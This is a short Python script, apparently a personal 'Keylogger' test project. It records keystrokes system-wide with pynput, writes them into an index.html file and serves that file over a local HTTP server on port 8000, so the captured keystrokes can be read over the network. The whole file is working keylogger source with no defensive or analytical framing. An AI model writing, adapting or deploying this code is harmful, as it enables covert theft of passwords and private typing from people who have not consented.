from pynput.keyboard import Key, Listener
import os
from concurrent.futures import ThreadPoolExecutor   

os.chdir('C:/Users/Romyojit/Desktop/PythonPrograms/Test_Projects/Keylogger')

liskey = []
al = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()_+{}|:<>? ")


def keyfunc():
    def on_press(key):
        if str(key)[1:-1] in al:
            liskey.append(str(key))
        print(f'{str(key)} pressed')


    def on_release(key):
        with open('C:/Users/Romyojit/Desktop/PythonPrograms/Test_Projects/Keylogger/index.html', 'w') as f:
            for item in liskey:
                f.write(item[1:-1]) 
        if key == Key.esc:
            exit
            # Stop listener
            return False


    # Collect events until released
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
       

def server():
    os.system('python -m http.server 8000') 

def main():
    with ThreadPoolExecutor(max_workers=2) as executor:
        # Submit tasks to the executor
        futures = [executor.submit(server), executor.submit(keyfunc)]

main()
        
